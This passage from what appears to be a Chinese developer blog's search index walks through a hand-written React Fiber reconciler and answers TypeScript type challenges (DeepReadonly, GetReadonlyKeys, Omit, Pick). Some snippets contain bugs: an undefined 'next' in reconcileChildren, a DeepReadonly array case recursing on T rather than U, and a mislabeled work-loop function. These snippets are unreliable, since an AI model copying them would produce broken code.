class=\"comment\">// 拿到更新队列</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> queue = workInProgress.<span class=\"property\">updateQueue</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 等待生效的队列</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> pendingQueue = queue.<span class=\"property\">shared</span>.<span class=\"property\">pending</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 如果有更新, 或者更新队列里有内容</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(pendingQueue !== <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        <span class=\"comment\">// 清除等待生效的更新 因为在这就要使用了可以清除了</span></span><br><span class=\"line\">        queue.<span class=\"property\">shared</span>.<span class=\"property\">pending</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 获取最后一个等待生效的更新 </span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> lastPendingUpdate = pendingQueue;</span><br><span class=\"line\">        <span class=\"comment\">// 第一个等待生效的更新</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> firstPendingUpdate = pendingQueue.<span class=\"property\">next</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 把更新链表剪开, 变成单向链表</span></span><br><span class=\"line\">        lastPendingUpdate.<span class=\"property\">next</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 获取老状态 (会不停更新和计算赋值新状态, 所以起名newState)</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> newState = workInProgress.<span class=\"property\">memoizedState</span>;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> update = firstPendingUpdate;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(update) {</span><br><span class=\"line\">            <span class=\"comment\">// 根据老状态和更新计算新状态</span></span><br><span class=\"line\">            newState = <span class=\"title function_\">getStateFromUpdate</span>(update, newState);</span><br><span class=\"line\">            update = update.<span class=\"property\">next</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 把最终计算到的状态赋值给 memoizedState</span></span><br><span class=\"line\">        workInProgress.<span class=\"property\">memoizedState</span> = newState;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据老状态和更新, 计算新状态</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} update 更新</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} prevState 上一个状态</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@returns</span> 新状态</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getStateFromUpdate</span>(<span class=\"params\">update, prevState</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(update.<span class=\"property\">tag</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"title class_\">UpdateState</span>:</span><br><span class=\"line\">            <span class=\"keyword\">const</span> { payload } = update;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">assign</span>({}, prevState, payload);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<h4 id=\"根据子虚拟dom创建子fiber节点\"><a href=\"#根据子虚拟dom创建子fiber节点\" class=\"headerlink\" title=\"根据子虚拟dom创建子fiber节点\"></a>根据子虚拟 dom 创建子 fiber 节点</h4><p>上上步还有一个 <code>reconcileChildren</code> 没有定义</p>\n<ol>\n<li><p>ReactFiberBeginWork.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { mountChildFibers, reconcileChildFibers } <span class=\"keyword\">from</span> <span class=\"string\">\"./ReactChildFiber\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据新的虚拟dom生成新的fiber链表</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} current 老的父fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} workInProgress 新的父fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} nextChildren 新的子虚拟dom</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">reconcileChildren</span>(<span class=\"params\">current, workInProgress, nextChildren</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 如果此新fiber没有老fiber, 说明是新创建的</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (current === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        <span class=\"comment\">// 挂在子fiber</span></span><br><span class=\"line\">        workInProgress.<span class=\"property\">child</span> = <span class=\"title function_\">mountChildFibers</span>(workInProgress, <span class=\"literal\">null</span>, next);</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 更新:  协调子fiber列表 需要做DOM-DIFF   (初始化时的根fiber是有老fiber的(一开始创建的))</span></span><br><span class=\"line\">        workInProgress.<span class=\"property\">child</span> = <span class=\"title function_\">reconcileChildFibers</span>(</span><br><span class=\"line\">        workInProgress,</span><br><span class=\"line\">        current.<span class=\"property\">child</span>,</span><br><span class=\"line\">        nextChildren</span><br><span class=\"line\">        );</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactChildFiber.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> { createFiberFromElement } <span class=\"keyword\">from</span> <span class=\"string\">'./ReactFiber'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> { <span class=\"variable constant_\">REACT_ELEMENT_TYPE</span> } <span class=\"keyword\">from</span> <span class=\"string\">'../../shared/ReactSymbols'</span>;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} shouldTrackSideEffect 是否跟踪副作用</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@returns</span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">createChildReconciler</span>(<span class=\"params\">shouldTrackSideEffect</span>) {</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">reconcileSingElement</span>(<span class=\"params\">returnFiber, currentFirstFiber, element</span>) {</span><br><span class=\"line\">        <span class=\"comment\">// 因为我们实现的是初次挂载, 老节点currentFirstFiber是没有的, </span></span><br><span class=\"line\">        <span class=\"comment\">// 所以可以直接根据虚拟dom创建fiber节点</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> created = <span class=\"title function_\">createFiberFromElement</span>(element);</span><br><span class=\"line\">        created.<span class=\"property\">return</span> = returnFiber;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> created;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 比较子fiber  (DOM-DIFF) 就是用老的fiber链表和新的虚拟dom进行比较</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} returnFiber 新父fiber</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} currentFirstFiber 当前的第一个子fiber(老fiber的第一个儿子)</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> {<span class=\"type\">*</span>} newChild 新的子虚拟dom</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">reconcileChildFibers</span>(<span class=\"params\">returnFiber, currentFirstFiber, newChild</span>) {</span><br><span class=\"line\">        <span class=\"comment\">// 现在暂时只考虑新的节点只有一个的情况</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">typeof</span> newChild === <span class=\"string\">'object'</span> &amp;&amp; newChild !== <span class=\"literal\">null</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">switch</span> (newChild.<span class=\"property\">$$typeof</span>) {</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"attr\">REACT_ELEMENT_TYPE</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"title function_\">reconcileSingElement</span>(</span><br><span class=\"line\">                        returnFiber,</span><br><span class=\"line\">                        currentFirstFiber,</span><br><span class=\"line\">                        newChild</span><br><span class=\"line\">                    );</span><br><span class=\"line\">                <span class=\"attr\">default</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> reconcileChildFibers;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有老父fiber 更新</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> reconcileChildFibers = <span class=\"title function_\">createChildReconciler</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"comment\">// 没有老的父fiber 更新</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> mountChildFibers = <span class=\"title function_\">createChildReconciler</span>(<span class=\"literal\">false</span>);</span><br></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>ReactFiber.js</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createFiberFromElement</span>(<span class=\"params\">element</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> type = element.<span class=\"property\">type</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> key = element.<span class=\"property\">key</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> pendingProps = element.<span class=\"property\">props</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> fiber = <span class=\"title function_\">createFiberFromTypeAndProps</span>(</span><br><span class=\"line\">        type,</span><br><span class=\"line\">        key,</span><br><span class=\"line\">        pendingProps</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fiber;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">export</span> <span class=\"keyword\">function</span> <span class=\"title function_\">createFiberFromTypeAndProps</span>(<span class=\"params\">type, key, pendingProps</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> fiberTag = <span class=\"title class_\">IndeterminateComponent</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> fiber = <span class=\"title function_\">createFiberNode</span>(fiberTag, pendingProps, key);</span><br><span class=\"line\">    fiber.<span class=\"property\">type</span> = type;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fiber;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n<h3 id=\"完成工作单元\"><a href=\"#完成工作单元\" class=\"headerlink\" title=\"完成工作单元\"></a>完成工作单元</h3><ol>\n<li>ReactFiberWorkLoop.js<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">completeUnitOfWork</span>(<span class=\"params\">unitOfWork</span>) {</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (next === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 说明已经完成</span></span><br><span class=\"line\">    <span class=\"comment\">// 完成工作单元</span></span><br><span class=\"line\">    + <span class=\"title function_\">completeUnitOfWork</span>(unitOfWork); <span class=\"comment\">// 这个方法之后写 先模拟一下完成工作</span></span><br><span class=\"line\">        <span class=\"comment\">// workInProgress = null;</span></span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 如果有子节点就成为下一个工作单元</span></span><br><span class=\"line\">        workInProgress = next;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">completeUnitOfWork</span>(<span class=\"params\">unitOfWork</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> completeWork = unitOfWork;</span><br><span class=\"line\">    <span class=\"keyword\">do</span> {</span><br><span class=\"line\">        <span class=\"comment\">// 拿到他的父节点和当前节点RootFiber</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> current = completeWork.<span class=\"property\">alternate</span>;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> returnFiber = completeWork.<span class=\"property\">return</span>;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> next = <span class=\"title function_\">completeWork</span>(current, completeWork);</span><br><span class=\"line\">        <span class=\"comment\">// 如果下一个节点不为空</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(next !== <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        workInProgress = next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">const</span> siblingFiber = completeWork.<span class=\"property\">sibling</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 如果兄弟节点不为空</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(siblingFiber !== <span class=\"literal\">null</span>) {</span><br><span class=\"line\">        workInProgress = siblingFiber;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"comment\">// 返回父节点</span></span><br><span class=\"line\">        completeWork = returnFiber;</span><br><span class=\"line\"></span><br><span class=\"line\">    } <span class=\"keyword\">while</span>(completeWork !== <span class=\"literal\">null</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure></li>\n</ol>\n","categories":["React"],"tags":["前端","JavaScript","react","JSX"]},{"title":"对象属性只读（递归）DeepReadonly","url":"//typescript/questions/DeepReadonly.html","content":"<p>实现一个泛型 <code>DeepReadonly&lt;T&gt;</code>，它将对象的每个参数及其子对象递归地设为只读。</p>\n<p>您可以假设在此挑战中我们仅处理对象。不考虑数组、函数、类等。但是，您仍然可以通过覆盖尽可能多的不同案例来挑战自己。</p>\n<p>例如</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> X = { </span><br><span class=\"line\">    <span class=\"attr\">x</span>: { </span><br><span class=\"line\">        <span class=\"attr\">a</span>: <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"attr\">b</span>: <span class=\"string\">'hi'</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"attr\">y</span>: <span class=\"string\">'hey'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">Expected</span> = { </span><br><span class=\"line\">    <span class=\"keyword\">readonly</span> <span class=\"attr\">x</span>: { </span><br><span class=\"line\">        <span class=\"keyword\">readonly</span> <span class=\"attr\">a</span>: <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">readonly</span> <span class=\"attr\">b</span>: <span class=\"string\">'hi'</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">readonly</span> <span class=\"attr\">y</span>: <span class=\"string\">'hey'</span> </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">Todo</span> = <span class=\"title class_\">DeepReadonly</span>&lt;X&gt; <span class=\"comment\">// should be same as `Expected`</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><ol>\n<li>属于基础类型则直接返回</li>\n<li>数组、Map、Set 需要拆分其内容属性 </li>\n</ol>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">Primitive</span> = <span class=\"literal\">undefined</span> | <span class=\"built_in\">string</span> | <span class=\"literal\">null</span> | <span class=\"built_in\">boolean</span> | <span class=\"built_in\">number</span> | <span class=\"title class_\">Function</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">DeepReadonly</span>&lt;T&gt; = T <span class=\"keyword\">extends</span> <span class=\"title class_\">Primitive</span></span><br><span class=\"line\">    ? T</span><br><span class=\"line\">    : T <span class=\"keyword\">extends</span> <span class=\"title class_\">Array</span>&lt;infer U&gt;</span><br><span class=\"line\">    ? <span class=\"title class_\">ReadonlyArray</span>&lt;<span class=\"title class_\">DeepReadonly</span>&lt;T&gt;&gt;</span><br><span class=\"line\">    : T <span class=\"keyword\">extends</span> <span class=\"title class_\">Map</span>&lt;infer K, infer V&gt;</span><br><span class=\"line\">    ? <span class=\"title class_\">ReadonlyMap</span>&lt;<span class=\"title class_\">DeepReadonly</span>&lt;K&gt;, <span class=\"title class_\">DeepReadonly</span>&lt;V&gt;&gt;</span><br><span class=\"line\">    : T <span class=\"keyword\">extends</span> <span class=\"title class_\">Set</span>&lt;infer U&gt;</span><br><span class=\"line\">    ? <span class=\"title class_\">ReadonlySet</span>&lt;<span class=\"title class_\">DeepReadonly</span>&lt;U&gt;&gt;</span><br><span class=\"line\">    : { <span class=\"keyword\">readonly</span> [K <span class=\"keyword\">in</span> keyof T]: <span class=\"title class_\">DeepReadonly</span>&lt;T[K]&gt; };</span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"获取只读属性 GetReadonlyKeys","url":"//typescript/questions/GetReadonlyKeys.html","content":"<p>实现泛型 <code>GetReadonlyKeys&lt;T&gt;</code>，<code>GetReadonlyKeys&lt;T&gt;</code> 返回由对象 T 所有只读属性的键组成的联合类型。</p>\n<p>例如</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\">  <span class=\"keyword\">readonly</span> <span class=\"attr\">title</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"keyword\">readonly</span> <span class=\"attr\">description</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">completed</span>: <span class=\"built_in\">boolean</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">Keys</span> = <span class=\"title class_\">GetReadonlyKeys</span>&lt;<span class=\"title class_\">Todo</span>&gt; <span class=\"comment\">// expected to be \"title\" | \"description\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解答\"><a href=\"#解答\" class=\"headerlink\" title=\"解答\"></a>解答</h3><ol>\n<li>映射类型：</li>\n</ol>\n<ul>\n<li>使用了映射类型语法 <code>[P in keyof T]</code>，遍历 <code>T</code> 类型的所有键（包括公共和私有属性以及方法）。</li>\n</ul>\n<ol start=\"2\">\n<li>条件类型与函数类型比较：</li>\n</ol>\n<ul>\n<li>对于每个键 <code>P</code>，创建一个返回值为布尔类型的匿名函数类型 <code>&lt;I&gt;() =&gt; ...</code>。</li>\n<li>第一个函数类型检查是否有一个对象类型，其具有属性 <code>I</code> 等于 <code>T[P]</code> 的类型，这实际上是为了确保当前键 <code>P</code> 的存在性。</li>\n<li>第二个函数类型则检查是否有只读版本的对象类型，其中属性 I 是只读的且类型为 <code>T[P]</code>。</li>\n</ul>\n<ol start=\"3\">\n<li>条件判断：</li>\n</ol>\n<ul>\n<li>判断第一个函数类型是否能赋值给第二个函数类型，即判断 <code>T[P]</code> 是否是一个只读属性。</li>\n<li>如果是，则结果为 <code>P</code>，表示该键 <code>P</code> 是只读属性。</li>\n<li>否则，结果为 <code>never</code>，表示该键不是只读属性。</li>\n</ul>\n<ol start=\"4\">\n<li>取可读属性键集合：</li>\n</ol>\n<ul>\n<li>最终通过 <code>keyof</code> 运算符从映射类型中提取所有满足上述条件（即为只读属性）的键 <code>P</code> 构成的联合类型。</li>\n</ul>\n<ol start=\"5\">\n<li>默认值 <code>never</code>：</li>\n</ol>\n<ul>\n<li>如果没有符合条件的只读属性，则整个映射类型的结果是空对象类型，因此 <code>keyof {}</code> 将得到 <code>never</code> 类型。</li>\n</ul>\n<p>综上所述，<code>GetReadonlyKeys&lt;T&gt;</code> 类型会返回 T 中所有声明为只读属性的键名组成的联合类型。如果 <code>T</code> 没有只读属性，则返回类型为 <code>never</code>。</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">GetReadonlyKeys</span>&lt;T&gt; = keyof {</span><br><span class=\"line\">    [</span><br><span class=\"line\">        P <span class=\"keyword\">in</span> keyof T <span class=\"keyword\">as</span> (</span><br><span class=\"line\">            &lt;I&gt;<span class=\"function\">() =&gt;</span> I <span class=\"keyword\">extends</span> ({ [I <span class=\"keyword\">in</span> P]: T[I] }) ? <span class=\"literal\">true</span> : <span class=\"built_in\">never</span></span><br><span class=\"line\">        ) <span class=\"keyword\">extends</span> (</span><br><span class=\"line\">            &lt;I&gt;<span class=\"function\">() =&gt;</span> I <span class=\"keyword\">extends</span> ({ <span class=\"keyword\">readonly</span> [I <span class=\"keyword\">in</span> P]: T[I] }) ? <span class=\"literal\">true</span> : <span class=\"built_in\">never</span></span><br><span class=\"line\">        ) ? P : <span class=\"built_in\">never</span></span><br><span class=\"line\">    ] : <span class=\"built_in\">never</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"实现 Omit","url":"//typescript/questions/omit.html","content":"<p>不使用 <code>Omit</code> 实现 <code>TypeScript</code> 的 <code>Omit&lt;T, K&gt;</code> 泛型。</p>\n<p><code>Omit</code> 会创建一个省略 <code>K</code> 中字段的 <code>T</code> 对象。</p>\n<p>例如：</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\">  <span class=\"attr\">title</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">description</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">completed</span>: <span class=\"built_in\">boolean</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">TodoPreview</span> = <span class=\"title class_\">MyOmit</span>&lt;<span class=\"title class_\">Todo</span>, <span class=\"string\">'description'</span> | <span class=\"string\">'title'</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"attr\">todo</span>: <span class=\"title class_\">TodoPreview</span> = {</span><br><span class=\"line\">  <span class=\"attr\">completed</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解答\"><a href=\"#解答\" class=\"headerlink\" title=\"解答\"></a>解答</h3><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\">    <span class=\"attr\">title</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    <span class=\"attr\">description</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    <span class=\"attr\">completed</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">MyOmit</span>&lt;T, K <span class=\"keyword\">extends</span> keyof T&gt; = {</span><br><span class=\"line\">    [P <span class=\"keyword\">in</span> keyof T <span class=\"keyword\">as</span> P <span class=\"keyword\">extends</span> K ? <span class=\"built_in\">never</span> : P]: T[P];</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// @ts-expect-error</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> error = <span class=\"title class_\">MyOmit</span>&lt;<span class=\"title class_\">Todo</span>, <span class=\"string\">\"description\"</span> | <span class=\"string\">\"invalid\"</span>&gt;;</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"实现 Pick","url":"//typescript/questions/pick.html","content":"<p>不使用 <code>Pick&lt;T, K&gt;</code> ，实现 TS 内置的 <code>Pick&lt;T, K&gt;</code> 的功能</p>\n<p><strong>从类型 <code>T</code> 中选出符合 <code>K</code> 的属性，构造一个新的类型</strong>。</p>\n<p>例如：</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\">  <span class=\"attr\">title</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">description</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span class=\"attr\">completed</span>: <span class=\"built_in\">boolean</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">TodoPreview</span> = <span class=\"title class_\">MyPick</span>&lt;<span class=\"title class_\">Todo</span>, <span class=\"string\">'title'</span> | <span class=\"string\">'completed'</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"attr\">todo</span>: <span class=\"title class_\">TodoPreview</span> = {</span><br><span class=\"line\">    <span class=\"attr\">title</span>: <span class=\"string\">'Clean room'</span>,</span><br><span class=\"line\">    <span class=\"attr\">completed</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"解答\"><a href=\"#解答\" class=\"headerlink\" title=\"解答\"></a>解答</h3><figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\"><span class=\"attr\">title</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"><span class=\"attr\">description</span>: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"><span class=\"attr\">completed</span>: <span class=\"built_in\">boolean</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 1. K extends keyof T, K继承所有的T的key属性为type</span></span><br><span class=\"line\"><span class=\"comment\">// 2. P in keyof T 拿出所有的key，在extends K，如果是true，则返回 P</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">MyPick</span>&lt;T, K <span class=\"keyword\">extends</span> keyof T&gt; = {</span><br><span class=\"line\">[P <span class=\"keyword\">in</span> keyof T <span class=\"keyword\">as</span> P <span class=\"keyword\">extends</span> K ? P : <span class=\"built_in\">never</span>]: T[P];</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">type</span> <span class=\"title class_\">TodoPreviewMy</span> = <span class=\"title class_\">MyPick</span>&lt;<span class=\"title class_\">Todo</span>, <span class=\"string\">\"title\"</span> | <span class=\"string\">\"completed\"</span>&gt;;</span><br><span class=\"line\"><span class=\"comment\">// type TodoPreviewMy = {</span></span><br><span class=\"line\"><span class=\"comment\">//     title: string;</span></span><br><span class=\"line\"><span class=\"comment\">//     completed: boolean;</span></span><br><span class=\"line\"><span class=\"comment\">// }</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"attr\">todo</span>: <span class=\"title class_\">TodoPreviewMy</span> = {</span><br><span class=\"line\">    <span class=\"attr\">title</span>: <span class=\"string\">\"Clean room\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">completed</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","TypeScript","type"],"tags":["前端","TypeScript","type"]},{"title":"对象属性只读 Readonly","url":"//typescript/questions/Readonly.html","content":"<p>不要使用内置的 <code>Readonly&lt;T&gt;</code>，自己实现一个。</p>\n<p>泛型 <code>Readonly&lt;T&gt;</code> 会接收一个 _泛型参数_，并返回一个完全一样的类型，只是所有属性都会是只读 (readonly) 的。</p>\n<p>也就是不可以再对该对象的属性赋值。</p>\n<p>例如：</p>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Todo</span> {</span><br><span class=\"line\">  <span class=\"attr\">title</span>: <span class=\"built_in\">string</span></span><br><span class=\"line\">  <span 